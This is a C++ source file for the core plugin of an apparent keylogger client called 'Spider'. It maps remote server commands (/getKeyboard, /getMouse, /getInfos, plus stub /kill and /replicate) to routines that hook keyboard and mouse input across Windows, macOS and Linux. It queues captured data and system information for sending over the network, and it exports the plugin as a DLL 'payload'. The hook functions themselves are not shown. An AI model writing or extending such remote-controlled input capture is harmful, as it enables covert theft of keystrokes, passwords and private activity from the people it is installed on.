#if defined _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#endif

#include "SpiderPlugin.h"
#include "CPUID.h"
#include <string>

namespace spider
{
namespace client
{
namespace library
{

mt::Queue<SystemMsg> *SpiderPlugin::m_sendToNetwork = nullptr;

SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false),
                               m_receivedFromNetwork(), m_networkResponseQueue(),
                               m_cmd {}
#if defined _WIN32
,
    m_keyboardHookWin(nullptr),
    m_mouseHookWin(nullptr)
#endif
{
    m_cmd["/getInfos"] = [this]() { getInfos(); };
    m_cmd["/getKeyboard"] = [this]() { getKeyboard(); };
    m_cmd["/getMouse"] = [this]() { getMouse(); };
    m_cmd["/kill"] = [this]() { kill(); };
    m_cmd["/replicate"] = [this]() { replicate(); };
}

SpiderPlugin::~SpiderPlugin()
{
}

bool SpiderPlugin::init(mt::Queue<SystemMsg> &inputQueue)
{
    bool ret;

    m_sendToNetwork = &inputQueue;
#if defined _WIN32
    ret = initWindows();
#elif defined __APPLE__
    ret = initOSX();
#elif defined __linux__
    ret = initLinux();
#endif
    return ret;
}

mt::Queue<SpiderPlugin::Order> &SpiderPlugin::getOrderQueue()
{
    return m_receivedFromNetwork;
}

// Get the message thread-safe queue, in order to response to the server
mt::Queue<std::string> &SpiderPlugin::getReponseQueue()
{
    return m_networkResponseQueue;
}

bool SpiderPlugin::deinit()
{
    bool ret;
#if defined _WIN32
    ret = deinitWindows();
#elif defined __APPLE__
    ret = deinitOSX();
#elif defined __linux__
    ret = deinitLinux();
#endif
    return ret;
}

void SpiderPlugin::getInfos()
{
    SystemMsg msg;

    msg.type = SystemMsgType::Infos;
    msg.currentWindow.fill(0);
    msg.data.size = sizeof(m_infos);
    msg.data.raw = reinterpret_cast<std::uint8_t const *>(&m_infos);
    m_networkResponseQueue.push("OK\r\n");
    m_sendToNetwork->push(msg);
}

bool SpiderPlugin::getKeyboard()
{
    if (!m_keyboardHook)
    {
// Hook keyboard
#if defined _WIN32
        m_keyboardHook = hookKeyboardWindows();
#elif defined __APPLE__
        m_keyboardHook = hookKeyboardOSX();
#elif defined __linux__
        m_keyboardHook = hookKeyboardLinux();
#endif
        m_networkResponseQueue.push((m_keyboardHook) ? "OK\r\n" : "KO\r\n");
    }
    else
    {
// Un-hook keyboard
#if defined _WIN32
        m_keyboardHook = unHookKeyboardWindows();
#elif defined __APPLE__
        m_keyboardHook = unHookKeyboardOSX();
#elif defined __linux__
        m_keyboardHook = unHookKeyboardLinux();
#endif
        m_networkResponseQueue.push("OK\r\n");
    }
    return m_keyboardHook;
}

bool SpiderPlugin::getMouse()
{
    if (!m_mouseHook)
    {
// Hook mouse
#if defined _WIN32
        m_mouseHook = hookMouseWindows();
#elif defined __APPLE__
        m_mouseHook = hookMouseOSX();
#elif defined __linux__
        m_mouseHook = hookMouseLinux();
#endif
        m_networkResponseQueue.push((m_mouseHook) ? "OK\r\n" : "KO\r\n");
    }
    else
    {
// Un-hook mouse
#if defined _WIN32
        m_mouseHook = unHookMouseWindows();
#elif defined __APPLE__
        m_mouseHook = unHookMouseOSX();
#elif defined __linux__
        m_mouseHook = unHookMouseLinux();
#endif
        m_networkResponseQueue.push("OK\r\n");
    }
    return m_mouseHook;
}

void SpiderPlugin::exec(Order const &order)
{
    if (m_cmd.find(order) != m_cmd.end())
    {
        m_cmd[order]();
    }
}

bool SpiderPlugin::kill()
{
    m_networkResponseQueue.push("KO\r\n");
    return true;
}

void SpiderPlugin::replicate()
{
    m_networkResponseQueue.push("KO\r\n");
}

void SpiderPlugin::run()
{
#if defined _WIN32
    runWindows();
#elif defined __APPLE__
    runOSX();
#elif defined __linux__
    runLinux();
#endif
}

#if defined __APPLE__ || defined __linux__

std::uint32_t SpiderPlugin::getPageSize() const
{
    // We're not using bitshifts -> undefined behavior
    for (std::uint32_t n = 1; n; n *= 2)
    {
        // Allocate a memory page
        void *p = mmap(0, n * 2, PROT_NONE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

        // If any error, stop everything
        if (p == MAP_FAILED)
        {
            break;
        }

        // Unmap datas
        std::int32_t u = munmap(reinterpret_cast<char *>(p) + n, n);
        munmap(p, n * 2);
        if (!u)
        {
            // We found the page size
            return n;
        }
    }
    return 0;
}

std::uint16_t SpiderPlugin::getNumberProcessors() const
{
    std::uint16_t nbCPUs = 0;
    char vendor[12];

    {
        CPUID cpuID(0);

        reinterpret_cast<std::uint32_t *>(vendor)[0] = cpuID.EBX();
        reinterpret_cast<std::uint32_t *>(vendor)[1] = cpuID.EDX();
        reinterpret_cast<std::uint32_t *>(vendor)[2] = cpuID.ECX();
    }
    std::string const cpuVendor = std::string(vendor, 12);

    // Get CPU features
    {
        CPUID cpuID(1);

        std::uint16_t cpuFeatures = cpuID.EDX();            // EDX
        std::uint16_t logical = (cpuID.EBX() >> 16) & 0xff; // EBX[23:16]
        nbCPUs = logical;
    }

    if (cpuVendor == "GenuineIntel")
    {
        // Get DCP cache info
        CPUID cpuID(4);

        nbCPUs = ((cpuID.EAX() >> 26) & 0x3f) + 1; // EAX[31:26] + 1
    }
    else if (cpuVendor == "AuthenticAMD")
    {
        // Get NC: Number of CPU cores - 1
        CPUID cpuID(0x80000008);

        nbCPUs = (static_cast<std::uint16_t>((cpuID.ECX() & 0xff))) + 1; // ECX[7:0] + 1
    }

    return nbCPUs;
}
#endif

void SpiderPlugin::extractPath(std::string &path)
{

    std::size_t found = path.find_last_of("/\\");
    path = path.substr(found + 1);

    if (path.length() > sizeof(network::tcp::PathArray))
    {
        path.resize(sizeof(network::tcp::PathArray) - 1);
    }
}
}
}
}

#if defined __linux__ || defined __APPLE__
#define SPIDER_API
#else
#define SPIDER_API __declspec(dllexport)
#endif

static spider::client::library::SpiderPlugin payload;

extern "C" {
SPIDER_API spider::client::library::IPayload *getPayload()
{
    return static_cast<spider::client::library::IPayload *>(&payload);
}

#if defined _WIN32
BOOLEAN WINAPI DllMain(HINSTANCE hDllHandle, DWORD nReason, LPVOID Reserved)
{
    return (true);
}
#endif
}